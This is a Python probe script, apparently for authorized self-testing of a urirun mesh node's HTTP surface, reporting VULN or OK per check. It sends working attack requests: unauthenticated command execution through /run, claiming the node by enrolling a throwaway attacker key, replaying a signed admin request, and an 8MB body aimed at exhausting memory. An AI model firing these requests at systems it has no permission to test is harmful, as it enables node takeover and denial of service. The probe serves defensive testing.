#!/usr/bin/env python3
# Mesh security probe — runs from a SEPARATE container with only network access to
# the node (no shared filesystem, no credentials). Each check reports VULN (the node
# let an unauthenticated/abusive request through) or OK. Authorized defensive testing
# of urirun's own mesh surface.
from __future__ import annotations

import json
import sys
import urllib.error
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://node:8765").rstrip("/")
findings: list[tuple[str, str, str]] = []  # (severity, id, note)


def http(method: str, path: str, *, body: bytes | None = None, headers: dict | None = None, timeout=5.0):
    req = urllib.request.Request(BASE + path, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:  # noqa: BLE001
        return None, str(e).encode()


def _attacker_key() -> str:
    """Generate a throwaway ed25519 key; return its OpenSSH private-key path."""
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, PrivateFormat
    k = Ed25519PrivateKey.generate()
    p = "/tmp/attacker_ed25519"
    open(p, "wb").write(k.private_bytes(Encoding.PEM, PrivateFormat.OpenSSH, NoEncryption()))
    return p


def check(sev: str, fid: str, vulnerable: bool, note: str):
    tag = "VULN" if vulnerable else "ok  "
    if vulnerable:
        findings.append((sev, fid, note))
    print(f"  [{tag}] {fid:28} {note}")


print(f"== mesh security probe vs {BASE} ==\n")

# 1) Transport: is it plaintext HTTP (sniff/MITM/replay possible)?
check("HIGH", "plaintext-transport", BASE.startswith("http://"),
      "node speaks plaintext HTTP — tokens & signed headers are sniffable, requests replayable (no TLS)")

# 2) Unauthenticated info disclosure
st_routes, b_routes = http("GET", "/routes")
nroutes = len(json.loads(b_routes or b"{}").get("routes", [])) if st_routes == 200 else -1
check("MED", "info-routes", st_routes == 200, f"GET /routes unauthenticated -> {st_routes}, exposes {nroutes} routes (capability map)")
st_err, _ = http("GET", "/errors")
check("MED", "info-errors", st_err == 200, f"GET /errors unauthenticated -> {st_err} (runtime error store: paths/payloads)")
st_h, b_h = http("GET", "/health")
check("LOW", "info-health", st_h == 200, f"GET /health unauthenticated -> {st_h} {json.loads(b_h or b'{}') if st_h==200 else ''}")

# 3) Unauthenticated command execution via /run (only the allow-glob guards it)
payload = json.dumps({"uri": "demo://host/shell/command/run", "payload": {"marker": "PWNED"}}).encode()
st, b = http("POST", "/run", body=payload, headers={"Content-Type": "application/json"})
out = ""
try:
    out = json.loads(b or b"{}").get("result", {}).get("stdout", "")
except Exception:
    pass
check("HIGH", "unauth-run-command", st == 200 and "EXECUTED:PWNED" in out,
      f"POST /run of a COMMAND route with NO auth -> {st}; executed={'EXECUTED:PWNED' in out} (broad --allow + command route = unauth exec)")

# 4) Trust-on-first-use enrollment: claim a fresh node with no credential
key = _attacker_key()
from urirun.node import keyauth  # noqa: E402
pub = keyauth.public_openssh(key)
enroll_body = json.dumps({"publicKey": pub}).encode()
st, b = http("POST", "/authorized-keys", body=enroll_body, headers={"Content-Type": "application/json"})
enrolled = st == 200 and json.loads(b or b"{}").get("ok") is True
check("HIGH", "tofu-enroll", enrolled,
      f"POST /authorized-keys with attacker key, NO signature -> {st} (first key claims a fresh node = takeover race)")

# 5) Replay: a captured signed admin request is accepted more than once (no nonce)
if enrolled:
    raw = json.dumps({"publicKey": pub}).encode()  # re-enroll self, signed
    hdrs = {**keyauth.sign(key, keyauth.PURPOSE_ENROLL, raw), "Content-Type": "application/json"}
    s1, _ = http("POST", "/authorized-keys", body=raw, headers=hdrs)
    s2, _ = http("POST", "/authorized-keys", body=raw, headers=hdrs)  # identical bytes + headers
    check("HIGH", "signed-request-replay", s1 == 200 and s2 == 200,
          f"same signed request accepted twice ({s1},{s2}) — no nonce/once-only, replayable within {keyauth.MAX_SKEW}s")
else:
    check("HIGH", "signed-request-replay", False, "skipped (enroll did not succeed)")

# 6) Unbounded request body (read_raw has no size cap) -> memory DoS vector
big = b'{"uri":"demo://host/echo/query/ping","payload":{"x":"' + b"A" * (8 * 1024 * 1024) + b'"}}'
st, _ = http("POST", "/run", body=big, headers={"Content-Type": "application/json"})
check("MED", "unbounded-body", st in (200, 400),
      f"node accepted an 8MB body -> {st} (read_raw reads Content-Length with no cap = memory DoS)")

print(f"\n== {len(findings)} findings ==")
for sev, fid, note in findings:
    print(f"  {sev:4} {fid}")
sys.exit(0)
